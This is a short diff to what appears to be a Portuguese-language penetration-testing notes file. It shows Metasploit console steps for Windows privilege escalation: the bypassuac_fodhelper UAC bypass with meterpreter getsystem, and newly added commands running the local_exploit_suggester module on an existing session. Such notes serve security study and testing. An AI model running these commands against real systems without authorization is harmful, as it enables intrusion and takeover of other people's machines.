@@ -34,3 +34,9 @@ exploit(windows/local/bypassuac_fodhelper)> run
 meterpreter> getsystem
 ~~~~
 
+Escalonamento de privilégios através de uma opção pré-instalada no Metasploit que oferece exploits de acordo com parâmetros do Windows
+~~~~
+exploit(multi/handler)> use post/multi/recon/local_exploit_suggester
+exploit(multi/handler)> set session 1 
+exploit(multi/handler)> run
+~~~~
